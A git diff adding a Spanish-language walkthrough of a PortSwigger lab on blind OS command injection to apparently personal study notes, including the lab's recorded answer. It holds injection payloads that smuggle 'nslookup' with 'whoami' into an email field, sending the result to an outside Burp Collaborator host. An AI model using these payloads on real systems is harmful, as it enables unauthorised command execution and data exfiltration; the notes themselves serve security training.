@@ -119,6 +119,19 @@
 1. Enviar un mensaje de feedback y capturar la request
 2. Setear el parámetro email=||nslookup burpcollaborator.net||
 
+### [Blind OS command injection with out-of-band data exfiltration](https://portswigger.net/web-security/os-command-injection/lab-blind-out-of-band-data-exfiltration)
+
+#### Descripción
+
+1. Enviar un mensaje de feedback y capturar la request
+2. Abrir Burp collaborator client y generar/copiar el "collaborator payload"
+3. Setear el parámetro email=||nslookup `whoami`.fn6xqhhzgnulzs5qkh18xj7ek5qwel.burpcollaborator.net|| reemplazando por la url generada
+4. En Burp collaborator client hacer un poll y verificar en las solicitudes recibidas el usuario
+
+#### Solución encontrada:
+
+peter-bC8z09
+
 ---
 
 ## [Server-side template injection](https://portswigger.net/web-security/server-side-template-injection)
